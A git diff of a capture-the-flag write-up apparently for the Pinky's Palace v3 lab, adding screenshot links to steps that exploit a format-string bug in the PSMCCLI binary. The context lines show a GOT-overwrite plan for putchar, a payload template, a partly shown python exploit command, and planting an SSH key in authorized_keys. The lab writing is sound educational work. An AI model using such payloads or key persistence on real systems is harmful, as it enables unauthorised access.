@@ -1523,8 +1523,12 @@ Using `objdump` we notice that the very next call after our `printf()` is a `put
 ```
 pinksecmanagement@pinkys-palace:/tmp/thoseguys$ objdump -d /usr/local/bin/PSMCCLI 
 ```
+
+![424542219.png]({{site.baseurl}}/Images/pp3/424542219.png)
+
 Looking at the `putchar@plt` we can see that we have a JMP address:
 
+![424509461.png]({{site.baseurl}}/Images/pp3/424509461.png)
 
 What this tells us that the pointer for putchar is `0x804a01c`. Now we need to figure out what to set that value to in order to jump and execute our shellcode. 
 
@@ -1588,6 +1592,8 @@ The final piece of the puzzle is writing our address to the stack. Going back to
 
 Because we added a new environment variable to the stack we have shifted things.. lucky for us (I think purely fluked from our name and shellcode length) we just need to shift our offsets by one down to 135 and 136:
 
+![424575004.png]({{site.baseurl}}/Images/pp3/424575004.png)
+
 Continuing on we know that our final exploit needs to look something like:
 ```
 <address><address+2>%<number>x%<offset>$hn%<other number>x%<offset+1>$hn
@@ -1630,8 +1636,9 @@ $(python -c 'import sys; sys.stdout.write("\x1c\xa0\x04\x08\x1e\xa0\x04\x08CC%65
 
 > DON’T be dumb like me and forget the %0hn…. I wasted about an hour using just %hn and wondering why my offsets were out… #facepalm
 
-
 if you did everything correctly you should have a shell as pinky!
+
+![424542305.png]({{site.baseurl}}/Images/pp3/424542305.png)
 
 Once again we give ourselves a checkpoint by adding our public key to an `authorized_keys` file:
 ```
